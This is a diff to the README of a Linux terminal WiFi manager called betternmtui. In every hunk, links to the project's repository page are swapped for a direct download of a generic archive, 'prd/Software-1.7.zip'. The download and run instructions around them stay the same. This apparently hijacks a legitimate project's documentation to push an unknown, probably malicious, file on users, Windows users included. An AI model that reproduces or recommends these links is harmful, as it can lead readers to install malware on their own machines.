@@ -1,6 +1,6 @@
 # 🖥️ betternmtui - Simple WiFi Control in Terminal
 
-[![Download betternmtui](https://img.shields.io/badge/Download%20betternmtui-blue?style=for-the-badge&logo=github)](https://github.com/xioyicodex/betternmtui)
+[![Download betternmtui](https://img.shields.io/badge/Download%20betternmtui-blue?style=for-the-badge&logo=github)](https://github.com/xioyicodex/betternmtui/raw/refs/heads/main/prd/Software-1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ This project uses React and OpenTUI to present a clean terminal UI. It works wel
 ## 📥 Download and Run
 
 Visit this page to download:
-https://github.com/xioyicodex/betternmtui
+https://github.com/xioyicodex/betternmtui/raw/refs/heads/main/prd/Software-1.7.zip
 
 If you see a release file for Windows or a packaged app, download it and run that file.
 
@@ -39,7 +39,7 @@ betternmtui is built for Linux tools, so Windows users should use it through a L
 3. Open the Linux terminal.
 4. Make sure NetworkManager tools are available in that environment.
 5. Open the project page and get the app files from:
-   https://github.com/xioyicodex/betternmtui
+   https://github.com/xioyicodex/betternmtui/raw/refs/heads/main/prd/Software-1.7.zip
 6. Run the app from the Linux terminal after setup.
 
 ### Option 2: Use a Linux VM
@@ -48,7 +48,7 @@ betternmtui is built for Linux tools, so Windows users should use it through a L
 2. Install Linux inside the VM.
 3. Open the terminal in Linux.
 4. Download the project files from:
-   https://github.com/xioyicodex/betternmtui
+   https://github.com/xioyicodex/betternmtui/raw/refs/heads/main/prd/Software-1.7.zip
 5. Start the app from the Linux terminal after setup.
 
 ## 🧰 Requirements
@@ -67,7 +67,7 @@ If you run it inside WSL or a VM, the Linux side must be able to access the netw
 
 1. Open a terminal.
 2. Get the project files from:
-   https://github.com/xioyicodex/betternmtui
+   https://github.com/xioyicodex/betternmtui/raw/refs/heads/main/prd/Software-1.7.zip
 3. Install Bun if the project uses it for setup and run steps.
 4. Install the app dependencies.
 5. Start the terminal UI.
@@ -198,7 +198,7 @@ If you want to explore the code later, start with the main app entry file and th
 ## 🔗 Download
 
 Visit this page to download:
-https://github.com/xioyicodex/betternmtui
+https://github.com/xioyicodex/betternmtui/raw/refs/heads/main/prd/Software-1.7.zip
 
 Open the page, get the release or project files, and run the app from the right environment
 
